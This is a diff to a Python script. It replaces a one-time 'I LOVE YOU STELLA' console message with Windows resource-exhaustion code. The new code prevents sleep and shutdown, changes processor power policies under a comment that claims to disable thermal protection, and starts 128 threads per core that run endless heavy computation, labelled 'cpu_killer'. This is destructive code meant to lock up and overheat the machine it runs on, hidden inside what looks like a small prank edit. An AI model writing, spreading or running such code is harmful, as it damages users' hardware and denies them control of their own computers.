@@ -1,9 +1,74 @@
-import os
 import time
+import threading
+import multiprocessing
+import os
+import subprocess
+import ctypes
 
-FLAG = "C:\\Windows\\Temp\\love_stella.flag"
+# ==========================================
+# 1. KAPANMAYI ENGELLE
+# ==========================================
+def prevent_shutdown():
+    while True:
+        try:
+            ctypes.windll.kernel32.SetThreadExecutionState(0x80000002)
+        except:
+            pass
+        time.sleep(1)
+threading.Thread(target=prevent_shutdown, daemon=True).start()
 
-if not os.path.exists(FLAG):
-    os.system('start cmd /c "color 0C & echo ==================== & echo   I LOVE YOU STELLA & echo ==================== & pause"')
-    with open(FLAG, "w") as f:
-        f.write("LOVE")
+# ==========================================
+# 2. TERMAL KORUMAYI KAPAT
+# ==========================================
+try:
+    subprocess.run('powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFINCPOL 2', shell=True)
+    subprocess.run('powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFDECPOL 1', shell=True)
+    subprocess.run('powercfg -setactive SCHEME_CURRENT', shell=True)
+except:
+    pass
+
+# ==========================================
+# 3. CPU ZORLAYICI (20 MİLYON İŞLEM)
+# ==========================================
+def cpu_killer():
+    while True:
+        # 20 MİLYON MATEMATİK İŞLEMİ
+        x = 3.14159
+        for _ in range(20000000):  # 20.000.000
+            x = x ** 1.00001
+            x = x / 1.000001
+            x = x * 0.999999
+            x = x + 0.000001
+
+        # 20 BİN ELEMANLI LİSTE
+        arr = [i ** i for i in range(20000)]
+        for _ in range(1000):
+            arr.sort()
+            arr.reverse()
+
+        # 20 BİN DÖNGÜ
+        for _ in range(20000):
+            a = 1.1
+            b = 2.2
+            c = a ** b
+            d = b ** a
+            e = c / d
+            f = d / c
+
+# ==========================================
+# 4. TÜM ÇEKİRDEKLERİ ZORLA
+# ==========================================
+core_count = multiprocessing.cpu_count()
+thread_count = core_count * 128
+
+print(f"[!] CPU {core_count} çekirdek, {thread_count} thread ile zorlanıyor...")
+print(f"[!] Her thread 20 milyon işlem yapacak...")
+
+for _ in range(thread_count):
+    threading.Thread(target=cpu_killer, daemon=True).start()
+
+# ==========================================
+# 5. SONSÜZ DÖNGÜ
+# ==========================================
+while True:
+    time.sleep(60)
